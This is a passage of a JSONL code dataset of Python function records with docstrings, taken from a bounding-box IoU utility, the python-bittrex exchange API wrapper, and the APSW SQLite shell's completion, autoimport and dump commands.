{"docstring": "\"\"\"Computes IoU between bounding boxes.\nParameters\n----------\nbox1 : ndarray\n    (N, 4) shaped array with bboxes\nbox2 : ndarray\n    (M, 4) shaped array with bboxes\nReturns\n-------\n: ndarray\n    (N, M) shaped array with IoUs\n\"\"\"\n", "func_signal": "def bbox_iou_numpy(box1, box2):\n", "code": "area = (box2[:, 2] - box2[:, 0]) * (box2[:, 3] - box2[:, 1])\n\niw = np.minimum(np.expand_dims(box1[:, 2], axis=1), box2[:, 2]) - np.maximum(\n    np.expand_dims(box1[:, 0], 1), box2[:, 0]\n)\nih = np.minimum(np.expand_dims(box1[:, 3], axis=1), box2[:, 3]) - np.maximum(\n    np.expand_dims(box1[:, 1], 1), box2[:, 1]\n)\niw = np.maximum(iw, 0)\nih = np.maximum(ih, 0)\nua = np.expand_dims((box1[:, 2] - box1[:, 0]) * (box1[:, 3] - box1[:, 1]), axis=1) + area - iw * ih\nua = np.maximum(ua, np.finfo(float).eps)\nintersection = iw * ih\n\nreturn intersection / ua", "path": "detector\\detector_utils.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"\nUsed to get details of buy or sell order\n\nEndpoint:\n1.1 /account/getorder\n2.0 /key/orders/getorder\n\n:param uuid: uuid of buy or sell order\n:type uuid: str\n:return:\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_order(self, uuid):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/account/getorder',\n    API_V2_0: '/key/orders/getorder'\n}, options={'uuid': uuid, 'orderid': uuid}, protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to view your history of withdrawals\n\nEndpoint:\n1.1 /account/getwithdrawalhistory\n2.0 /key/balance/getwithdrawalhistory\n\n:param currency: String literal for the currency (ie. BTC)\n:type currency: str\n:return: withdrawal history in JSON\n:rtype : dict\n\"\"\"\n\n", "func_signal": "def get_withdrawal_history(self, currency=None):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/account/getwithdrawalhistory',\n    API_V2_0: '/key/balance/getwithdrawalhistory'\n}, options={'currency': currency, 'currencyname': currency} if currency else None,\n    protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to get all supported currencies at Bittrex\nalong with other meta data.\n\nEndpoint:\n1.1 /public/getcurrencies\n2.0 /pub/Currencies/GetCurrencies\n\n:return: Supported currencies info in JSON\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_currencies(self):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/public/getcurrencies',\n    API_V2_0: '/pub/Currencies/GetCurrencies'\n}, protection=PROTECTION_PUB)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to get the open and available trading markets\nat Bittrex along with other meta data.\n\n1.1 Endpoint: /public/getmarkets\n2.0 NO Equivalent\n\nExample ::\n    {'success': True,\n     'message': '',\n     'result': [ {'MarketCurrency': 'LTC',\n                  'BaseCurrency': 'BTC',\n                  'MarketCurrencyLong': 'Litecoin',\n                  'BaseCurrencyLong': 'Bitcoin',\n                  'MinTradeSize': 1e-08,\n                  'MarketName': 'BTC-LTC',\n                  'IsActive': True,\n                  'Created': '2014-02-13T00:00:00',\n                  'Notice': None,\n                  'IsSponsored': None,\n                  'LogoUrl': 'https://i.imgur.com/R29q3dD.png'},\n                  ...\n                ]\n    }\n\n:return: Available market info in JSON\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_markets(self):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/public/getmarkets',\n}, protection=PROTECTION_PUB)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to view your pending withdrawals\n\nEndpoint:\n1.1 NO EQUIVALENT\n2.0 /key/balance/getpendingwithdrawals\n\n:param currency: String literal for the currency (ie. BTC)\n:type currency: str\n:return: pending withdrawals in JSON\n:rtype : list\n\"\"\"\n", "func_signal": "def get_pending_withdrawals(self, currency=None):\n", "code": "return self._api_query(path_dict={\n    API_V2_0: '/key/balance/getpendingwithdrawals'\n}, options={'currencyname': currency} if currency else None,\n    protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to cancel a buy or sell order\n\nEndpoint:\n1.1 /market/cancel\n2.0 /key/market/tradecancel\n\n:param uuid: uuid of buy or sell order\n:type uuid: str\n:return:\n:rtype : dict\n\"\"\"\n", "func_signal": "def cancel(self, uuid):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/market/cancel',\n    API_V2_0: '/key/market/tradecancel'\n}, options={'uuid': uuid, 'orderid': uuid}, protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to get the last 24 hour summary of all active\nexchanges in specific coin\n\nEndpoint:\n1.1 /public/getmarketsummary\n2.0 /pub/Market/GetMarketSummary\n\n:param market: String literal for the market(ex: BTC-XRP)\n:type market: str\n:return: Summaries of active exchanges of a coin in JSON\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_market_summary(self, market):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/public/getmarketsummary',\n    API_V2_0: '/pub/Market/GetMarketSummary'\n}, options={'market': market, 'marketname': market}, protection=PROTECTION_PUB)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to get the current tick values for a market.\n\nEndpoints:\n1.1 /public/getticker\n2.0 NO EQUIVALENT -- but get_latest_candle gives comparable data\n\n:param market: String literal for the market (ex: BTC-LTC)\n:type market: str\n:return: Current values for given market in JSON\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_ticker(self, market):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/public/getticker',\n}, options={'market': market}, protection=PROTECTION_PUB)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to get all tick candles for a market.\n\nEndpoint:\n1.1 NO EQUIVALENT\n2.0 /pub/market/GetTicks\n\nExample  ::\n    { success: true,\n      message: '',\n      result:\n       [ { O: 421.20630125,\n           H: 424.03951276,\n           L: 421.20630125,\n           C: 421.20630125,\n           V: 0.05187504,\n           T: '2016-04-08T00:00:00',\n           BV: 21.87921187 },\n         { O: 420.206,\n           H: 420.206,\n           L: 416.78743422,\n           C: 416.78743422,\n           V: 2.42281573,\n           T: '2016-04-09T00:00:00',\n           BV: 1012.63286332 }]\n    }\n\n:return: Available tick candles in JSON\n:rtype: dict\n\"\"\"\n\n", "func_signal": "def get_candles(self, market, tick_interval):\n", "code": "return self._api_query(path_dict={\n    API_V2_0: '/pub/market/GetTicks'\n}, options={\n    'marketName': market, 'tickInterval': tick_interval\n}, protection=PROTECTION_PUB)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to get the latest candle for the market.\n\nEndpoint:\n1.1 NO EQUIVALENT\n2.0 /pub/market/GetLatestTick\n\nExample ::\n    { success: true,\n      message: '',\n      result:\n      [ {   O : 0.00350397,\n            H : 0.00351000,\n            L : 0.00350000,\n            C : 0.00350350,\n            V : 1326.42643480,\n            T : 2017-11-03T03:18:00,\n            BV: 4.64416189 } ]\n    }\n\n:return: Available latest tick candle in JSON\n:rtype: dict\n\"\"\"\n\n", "func_signal": "def get_latest_candle(self, market, tick_interval):\n", "code": "return self._api_query(path_dict={\n    API_V2_0: '/pub/market/GetLatestTick'\n}, options={\n    'marketName': market, 'tickInterval': tick_interval\n}, protection=PROTECTION_PUB)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nGenerate a deposit address for the specified currency\n\nEndpoint:\n1.1 NO EQUIVALENT\n2.0 /key/balance/generatedepositaddress\n\n:param currency: String literal for the currency (ie. BTC)\n:type currency: str\n:return: result of creation operation\n:rtype : dict\n\"\"\"\n", "func_signal": "def generate_deposit_address(self, currency):\n", "code": "return self._api_query(path_dict={\n    API_V2_0: '/key/balance/getpendingdeposits'\n}, options={'currencyname': currency}, protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to generate or retrieve an address for a specific currency\n\nEndpoint:\n1.1 /account/getdepositaddress\n2.0 /key/balance/getdepositaddress\n\n:param currency: String literal for the currency (ie. BTC)\n:type currency: str\n:return: Address info in JSON\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_deposit_address(self, currency):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/account/getdepositaddress',\n    API_V2_0: '/key/balance/getdepositaddress'\n}, options={'currency': currency, 'currencyname': currency}, protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to place a sell order in a specific market. Use selllimit to place\nlimit orders Make sure you have the proper permissions set on your\nAPI keys for this call to work\n\nEndpoint:\n1.1 /market/selllimit\n2.0 NO Direct equivalent.  Use trade_sell for LIMIT and MARKET sells\n\n:param market: String literal for the market (ex: BTC-LTC)\n:type market: str\n:param quantity: The amount to sell\n:type quantity: float\n:param rate: The rate at which to place the order.\n    This is not needed for market orders\n:type rate: float\n:return:\n:rtype : dict\n\"\"\"\n", "func_signal": "def sell_limit(self, market, quantity, rate):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/market/selllimit',\n}, options={'market': market,\n            'quantity': quantity,\n            'rate': rate}, protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to view balance distibution\n\nEndpoints:\n1.1 NO Equivalent\n2.0 /pub/Currency/GetBalanceDistribution\n\n:return:\n\"\"\"\n", "func_signal": "def get_balance_distribution(self):\n", "code": "return self._api_query(path_dict={\n    API_V2_0: '/pub/Currency/GetBalanceDistribution'\n}, protection=PROTECTION_PUB)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to retrieve the balance from your account for a specific currency\n\nEndpoint:\n1.1 /account/getbalance\n2.0 /key/balance/getbalance\n\nExample ::\n    {'success': True,\n     'message': '',\n     'result': {'Currency': '1ST',\n                'Balance': 10.0,\n                'Available': 10.0,\n                'Pending': 0.0,\n                'CryptoAddress': None}\n    }\n\n\n:param currency: String literal for the currency (ex: LTC)\n:type currency: str\n:return: Balance info in JSON\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_balance(self, currency):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/account/getbalance',\n    API_V2_0: '/key/balance/getbalance'\n}, options={'currency': currency, 'currencyname': currency}, protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to get the last 24 hour summary of all active exchanges\n\nEndpoint:\n1.1 /public/getmarketsummaries\n2.0 /pub/Markets/GetMarketSummaries\n\n:return: Summaries of active exchanges in JSON\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_market_summaries(self):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/public/getmarketsummaries',\n    API_V2_0: '/pub/Markets/GetMarketSummaries'\n}, protection=PROTECTION_PUB)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to get retrieve the orderbook for a given market.\n\nThe depth_type parameter is IGNORED under v2.0 and both orderbooks are always returned\n\nEndpoint:\n1.1 /public/getorderbook\n2.0 /pub/Market/GetMarketOrderBook\n\n:param market: String literal for the market (ex: BTC-LTC)\n:type market: str\n:param depth_type: buy, sell or both to identify the type of\n    orderbook to return.\n    Use constants BUY_ORDERBOOK, SELL_ORDERBOOK, BOTH_ORDERBOOK\n:type depth_type: str\n:return: Orderbook of market in JSON\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_orderbook(self, market, depth_type=BOTH_ORDERBOOK):\n", "code": "return self._api_query(path_dict={\n    API_V1_1: '/public/getorderbook',\n    API_V2_0: '/pub/Market/GetMarketOrderBook'\n}, options={'market': market, 'marketname': market, 'type': depth_type}, protection=PROTECTION_PUB)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nHelper function to see which markets exist for a currency.\n\nEndpoint: /public/getmarkets\n\nExample ::\n    >>> Bittrex(None, None).list_markets_by_currency('LTC')\n    ['BTC-LTC', 'ETH-LTC', 'USDT-LTC']\n\n:param currency: String literal for the currency (ex: LTC)\n:type currency: str\n:return: List of markets that the currency appears in\n:rtype: list\n\"\"\"\n", "func_signal": "def list_markets_by_currency(self, currency):\n", "code": "return [market['MarketName'] for market in self.get_markets()['result']\n        if market['MarketName'].lower().endswith(currency.lower())]", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to withdraw funds from your account\n\nEndpoint:\n1.1 /account/withdraw\n2.0 /key/balance/withdrawcurrency\n\n:param currency: String literal for the currency (ie. BTC)\n:type currency: str\n:param quantity: The quantity of coins to withdraw\n:type quantity: float\n:param address: The address where to send the funds.\n:type address: str\n:param paymentid: Optional argument for memos, tags, or other supplemental information for cryptos such as XRP.\n:type paymentid: str\n:return:\n:rtype : dict\n\"\"\"\n", "func_signal": "def withdraw(self, currency, quantity, address, paymentid=None):\n", "code": "options = {\n    'currency': currency,\n    'quantity': quantity,\n    'address': address\n}\nif paymentid:\n    options['paymentid'] = paymentid\nreturn self._api_query(path_dict={\n    API_V1_1: '/account/withdraw',\n    API_V2_0: '/key/balance/withdrawcurrency'\n}, options=options, protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"\nUsed to retrieve order trade history of account\n\nEndpoint:\n1.1 /account/getorderhistory\n2.0 /key/orders/getorderhistory or /key/market/GetOrderHistory\n\n:param market: optional a string literal for the market (ie. BTC-LTC).\n    If omitted, will return for all markets\n:type market: str\n:return: order history in JSON\n:rtype : dict\n\"\"\"\n", "func_signal": "def get_order_history(self, market=None):\n", "code": "if market:\n    return self._api_query(path_dict={\n        API_V1_1: '/account/getorderhistory',\n        API_V2_0: '/key/market/GetOrderHistory'\n    }, options={'market': market, 'marketname': market}, protection=PROTECTION_PRV)\nelse:\n    return self._api_query(path_dict={\n        API_V1_1: '/account/getorderhistory',\n        API_V2_0: '/key/orders/getorderhistory'\n    }, protection=PROTECTION_PRV)", "path": "bittrex\\bittrex.py", "repo_name": "ericsomdahl/python-bittrex", "stars": 598, "license": "mit", "language": "python", "size": 71}
{"docstring": "\"\"\"Provide some completions for SQL\n\n:param line: The current complete input line\n:param token: The word readline is looking for matches\n:param beg: Integer offset of token in line\n:param end: Integer end of token in line\n:return: A list of completions, or an empty list if none\n\"\"\"\n", "func_signal": "def complete_sql(self, line, token, beg, end):\n", "code": "if self._completion_cache is None:\n    cur=self.db.cursor()\n    collations=[row[1] for row in cur.execute(\"pragma collation_list\")]\n    databases=[row[1] for row in cur.execute(\"pragma database_list\")]\n    other=[]\n    for db in databases:\n        if db==\"temp\":\n            master=\"sqlite_temp_master\"\n        else:\n            master=\"[%s].sqlite_master\" % (db,)\n        for row in cur.execute(\"select * from \"+master).fetchall():\n            for col in (1,2):\n                if row[col] not in other and not row[col].startswith(\"sqlite_\"):\n                    other.append(row[col])\n            if row[0]==\"table\":\n                try:\n                    for table in cur.execute(\"pragma [%s].table_info([%s])\" % (db, row[1],)).fetchall():\n                        if table[1] not in other:\n                            other.append(table[1])\n                        for item in table[2].split():\n                            if item not in other:\n                                other.append(item)\n                except apsw.SQLError:\n                    # See https://github.com/rogerbinns/apsw/issues/86\n                    pass\n\n    self._completion_cache=[self._sqlite_keywords, self._sqlite_functions, self._sqlite_special_names, collations, databases, other]\n    for i in range(len(self._completion_cache)):\n        self._completion_cache[i].sort()\n\n# be somewhat sensible about pragmas\nif \"pragma \" in line.lower():\n    t=self._get_prev_tokens(line.lower(), end)\n\n    # pragma foo = bar\n    if len(t)>2 and t[-3]==\"pragma\":\n        # t[-2] should be a valid one\n        for p in self._pragmas:\n            if p.replace(\"=\",\"\")==t[-2]:\n                vals=self._pragmas[p]\n                if not vals:\n                    return []\n                return [x+\";\" for x in vals if x.startswith(token)]\n    # at equals?\n    if len(t)>1 and t[-2]==\"pragma\" and line[:end].replace(\" \",\"\").endswith(\"=\"):\n        for p in self._pragmas:\n            if p.replace(\"=\",\"\")==t[-1]:\n                vals=self._pragmas[p]\n                if not vals:\n                    return []\n                return vals\n    # pragma foo\n    if len(t)>1 and t[-2]==\"pragma\":\n        res=[x for x in self._pragmas.keys() if x.startswith(token)]\n        res.sort()\n        return res\n\n    # pragma\n    if len(t) and t[-1]==\"pragma\":\n        res=list(self._pragmas.keys())\n        res.sort()\n        return res\n\n# This is currently not context sensitive (eg it doesn't look\n# to see if last token was 'FROM' and hence next should only\n# be table names.  That is a SMOP like pragmas above\nres=[]\nut=token.upper()\nfor corpus in self._completion_cache:\n    for word in corpus:\n        if word.upper().startswith(ut):\n            # potential match - now match case\n            if word.startswith(token): # exact\n                if word not in res:\n                    res.append(word)\n            elif word.lower().startswith(token): # lower\n                if word.lower() not in res:\n                    res.append(word.lower())\n            elif word.upper().startswith(token): # upper\n                if word.upper() not in res:\n                    res.append(word.upper())\n            else:\n                # match letter by letter otherwise readline mangles what was typed in\n                w=token+word[len(token):]\n                if w not in res:\n                    res.append(w)\nreturn res", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "# Sets up color for output.  Input being interactive doesn't\n# matter.  This method needs to be called on all changes to\n# output.\n", "func_signal": "def _out_colour(self):\n", "code": "if getattr(self.stdout, \"isatty\", False) and self.stdout.isatty():\n    self.colour=self._colours[self.colour_scheme]\nelse:\n    self.colour=self._colours[\"off\"]", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"exit:Exit this program\"\"\"\n", "func_signal": "def command_exit(self, cmd):\n", "code": "if len(cmd):\n    raise self.Error(\"Exit doesn't take any parameters\")\nsys.exit(0)", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"Deal with keyboard interrupt (typically Control-C).  It\nwill :meth:`~Connection.interrupt` the database and print\"^C\" if interactive.\"\"\"\n", "func_signal": "def handle_interrupt(self):\n", "code": "self.db.interrupt()\nif not self.bail and self.interactive:\n    self.write(self.stderr, \"^C\\n\")\n    return\nraise", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"autoimport FILENAME ?TABLE?: Imports filename creating a table and automatically working out separators and data types (alternative to .import command)\n\nThe import command requires that you precisely pre-setup the\ntable and schema, and set the data separators (eg commas or\ntabs).  In many cases this information can be automatically\ndeduced from the file contents which is what this command\ndoes.  There must be at least two columns and two rows.\n\nIf the table is not specified then the basename of the file\nwill be used.\n\nAdditionally the type of the contents of each column is also\ndeduced - for example if it is a number or date.  Empty values\nare turned into nulls.  Dates are normalized into YYYY-MM-DD\nformat and DateTime are normalized into ISO8601 format to\nallow easy sorting and searching.  4 digit years must be used\nto detect dates.  US (swapped day and month) versus rest of\nthe world is also detected providing there is at least one\nvalue that resolves the ambiguity.\n\nCare is taken to ensure that columns looking like numbers are\nonly treated as numbers if they do not have unnecessary\nleading zeroes or plus signs.  This is to avoid treating phone\nnumbers and similar number like strings as integers.\n\nThis command can take quite some time on large files as they\nare effectively imported twice.  The first time is to\ndetermine the format and the types for each column while the\nsecond pass actually imports the data.\n\"\"\"\n", "func_signal": "def command_autoimport(self, cmd):\n", "code": "if len(cmd)<1 or len(cmd)>2:\n    raise self.Error(\"Expected one or two parameters\")\nif not os.path.exists(cmd[0]):\n    raise self.Error(\"File \\\"%s\\\" does not exist\" % (cmd[0],))\nif len(cmd)==2:\n    tablename=cmd[1]\nelse:\n    tablename=None\ntry:\n    final=None\n    c=self.db.cursor()\n    c.execute(\"BEGIN IMMEDIATE\")\n    final=\"ROLLBACK\"\n\n    if not tablename:\n        tablename=os.path.splitext(os.path.basename(cmd[0]))[0]\n\n    if c.execute(\"pragma table_info(%s)\" % (self._fmt_sql_identifier(tablename),)).fetchall():\n        raise self.Error(\"Table \\\"%s\\\" already exists\" % (tablename,))\n\n    # The types we support deducing\n    def DateUS(v): # US formatted date with wrong ordering of day and month\n        return DateWorld(v, switchdm=True)\n    def DateWorld(v, switchdm=False): # Sensibly formatted date as used anywhere else in the world\n        y,m,d=self._getdate(v)\n        if switchdm: m,d=d,m\n        if m<1 or m>12 or d<1 or d>31:\n            raise ValueError\n        return \"%d-%02d-%02d\" % (y,m,d)\n    def DateTimeUS(v): # US date and time\n        return DateTimeWorld(v, switchdm=True)\n    def DateTimeWorld(v, switchdm=False): # Sensible date and time\n        y,m,d,h,M,s=self._getdatetime(v)\n        if switchdm: m,d=d,m\n        if m<1 or m>12 or d<1 or d>31 or h<0 or h>23 or M<0 or M>59 or s<0 or s>65:\n            raise ValueError\n        return \"%d-%02d-%02dT%02d:%02d:%02d\" % (y,m,d,h,M,s)\n    def Number(v): # we really don't want phone numbers etc to match\n        # Python's float & int constructors allow whitespace which we don't\n        if re.search(r\"\\s\", v):\n            raise ValueError\n        if v==\"0\": return 0\n        if v[0]==\"+\": # idd prefix\n            raise ValueError\n        if re.match(\"^[0-9]+$\", v):\n            if v[0]==\"0\": raise ValueError # also a phone number\n            return int(v)\n        if v[0]==\"0\" and not v.startswith(\"0.\"): # deceptive not a number\n            raise ValueError\n        return float(v)\n\n    # Work out the file format\n    formats=[\n        {\"dialect\": \"excel\"},\n        {\"dialect\": \"excel-tab\"}]\n    seps=[\"|\", \";\", \":\"]\n    if self.separator not in seps:\n        seps.append(self.separator)\n    for sep in seps:\n        formats.append(\n            {\"quoting\": csv.QUOTE_NONE,\n             \"delimiter\": sep,\n             \"doublequote\": False,\n             \"quotechar\": \"\\x00\"}\n            )\n    possibles=[]\n    errors=[]\n    encodingissue=False\n    # format is copy() on every use.  This appears bizarre and\n    # unnecessary.  However Python 2.3 and 2.4 somehow manage\n    # to empty it if not copied.\n    for format in formats:\n        ncols=-1\n        lines=0\n        try:\n            for line in self._csvin_wrapper(cmd[0], format.copy()):\n                if lines==0:\n                    lines=1\n                    ncols=len(line)\n                    # data type guess setup\n                    datas=[]\n                    for i in range(ncols):\n                        datas.append([DateUS, DateWorld, DateTimeUS, DateTimeWorld, Number])\n                    allblanks=[True]*ncols\n                    continue\n                if len(line)!=ncols:\n                    raise ValueError(\"Expected %d columns - got %d\" % (ncols, len(line)))\n                lines+=1\n                for i in range(ncols):\n                    if not line[i]:\n                        continue\n                    allblanks[i]=False\n                    if not datas[i]:\n                        continue\n                    # remove datas that give ValueError\n                    d=[]\n                    for dd in datas[i]:\n                        try:\n                            dd(line[i])\n                            d.append(dd)\n                        except ValueError:\n                            pass\n                    datas[i]=d\n            if ncols>1 and lines>1:\n                # if a particular column was allblank then clear datas for it\n                for i in range(ncols):\n                    if allblanks[i]:\n                        datas[i]=[]\n                possibles.append((format.copy(), ncols, lines, datas))\n        except UnicodeDecodeError:\n            encodingissue=True\n        except:\n            s=str(sys.exc_info()[1])\n            if s not in errors:\n                errors.append(s)\n\n    if len(possibles)==0:\n        if encodingissue:\n            raise self.Error(\"The file is probably not in the current encoding \\\"%s\\\" and didn't match a known file format\" % (self.encoding[0],))\n        v=\"File doesn't appear to match a known type.\"\n        if len(errors):\n            v+=\"  Errors reported:\\n\"+\"\\n\".join([\"  \"+e for e in errors])\n        raise self.Error(v)\n    if len(possibles)>1:\n        raise self.Error(\"File matches more than one type!\")\n    format, ncols, lines, datas=possibles[0]\n    fmt=format.get(\"dialect\", None)\n    if fmt is None:\n        fmt=\"(delimited by \\\"%s\\\")\" % (format[\"delimiter\"],)\n    self.write(self.stdout, \"Detected Format %s  Columns %d  Rows %d\\n\" % (fmt, ncols, lines))\n    # Header row\n    reader=self._csvin_wrapper(cmd[0], format)\n    for header in reader:\n        break\n    # Check schema\n    identity=lambda x:x\n    for i in range(ncols):\n        if len(datas[i])>1:\n            raise self.Error(\"Column #%d \\\"%s\\\" has ambiguous data format - %s\" % (i+1, header[i], \", \".join([d.__name__ for d in datas[i]])))\n        if datas[i]:\n            datas[i]=datas[i][0]\n        else:\n            datas[i]=identity\n    # Make the table\n    sql=\"CREATE TABLE %s(%s)\" % (self._fmt_sql_identifier(tablename), \", \".join([self._fmt_sql_identifier(h) for h in header]))\n    c.execute(sql)\n    # prep work for each row\n    sql=\"INSERT INTO %s VALUES(%s)\" % (self._fmt_sql_identifier(tablename), \",\".join([\"?\"]*ncols))\n    for line in reader:\n        vals=[]\n        for i in range(ncols):\n            l=line[i]\n            if not l:\n                vals.append(None)\n            else:\n                vals.append(datas[i](l))\n        c.execute(sql, vals)\n\n    c.execute(\"COMMIT\")\n    self.write(self.stdout, \"Auto-import into table \\\"%s\\\" complete\\n\" % (tablename,))\nexcept:\n    if final:\n        self.db.cursor().execute(final)\n    raise", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"When displaying an error in :meth:`handle_exception` we\nwant to give context such as when the commands being executed\ncame from a .read command (which in turn could execute another\n.read).\n\"\"\"\n", "func_signal": "def _append_input_description(self):\n", "code": "if self.interactive:\n    return\nres=[]\nres.append(\"Line %d\" % (self.input_line_number,))\nres.append(\": \"+getattr(self.stdin, \"name\", \"<stdin>\"))\nself._input_descriptions.append(\" \".join(res))", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"separator STRING: Change separator for output mode and .import\n\nYou can use quotes and backslashes.  For example to set the\nseparator to space tab space you can use:\n\n  .separator \" \\\\t \"\n\nThe setting is automatically changed when you switch to csv or\ntabs output mode.  You should also set it before doing an\nimport (ie , for CSV and \\\\t for TSV).\n\"\"\"\n", "func_signal": "def command_separator(self, cmd):\n", "code": "if len(cmd)!=1:\n    raise self.Error(\"separator takes exactly one parameter\")\nself.separator=self.fixup_backslashes(cmd[0])", "path": "supersqlite\\third_party\\_apsw\\tools\\shell.py", "repo_name": "plasticityai/supersqlite", "stars": 711, "license": "mit", "language": "python", "size": 25912}
{"docstring": "\"\"\"dump ?TABLE? [TABLE...]: Dumps all or specified tables in SQL text format\n\nThe table name is treated as like pattern so you can use % as\na wildcard.  You can use dump to make a text based backup of\nthe database.  It is also useful for comparing differences or\nmaking the data available to other databases.  Indices and\ntriggers for the table(s) are also dumped.  Finally views\nmatching the table pattern name are dumped (it isn't possible\nto work out which views access which table and views can\naccess multiple tables anyway).\n\nNote that if you are dumping virtual tables such as used by\nthe FTS3 module then they may use other tables to store\ninformation.  For example if you create a FTS3 table named\n*recipes* then it also creates *recipes_content*,\n*recipes_segdir* etc.  Consequently to dump this example\ncorrectly use::\n\n   .dump recipes recipes_%\n\nIf the database is empty or no tables/views match then there\nis no output.\n\"\"\"\n# Simple tables are easy to dump.  More complicated is dealing\n# with virtual tables, foreign keys etc.\n\n# Lock the database while doing the dump so nothing changes\n# under our feet\n", "func_signal": "def command_dump(self, cmd):\n", "code": "self.process_sql(\"BEGIN IMMEDIATE\", internal=True)\n\n# Used in comment() - see issue 142\noutputstrtype=str\nif sys.version_info<(3,0):\n    outputstrtype=unicode\n\n# Python 2.3 can end up with nonsense like \"en_us\" so we fall\n# back to ascii in that case\noutputstrencoding=getattr(self.stdout, \"encoding\", \"ascii\")\ntry:\n    codecs.lookup(outputstrencoding)\nexcept:\n    outputstrencoding=\"ascii\"\n\ndef unicodify(s):\n    if not isinstance(s, outputstrtype):\n        # See issue 142 - it may not be in an expected encoding\n        return s.decode(outputstrencoding, \"replace\")\n    return s\n\ntry:\n    # first pass -see if virtual tables or foreign keys are in\n    # use.  If they are we emit pragmas to deal with them, but\n    # prefer not to emit them\n    v={\"virtuals\": False,\n       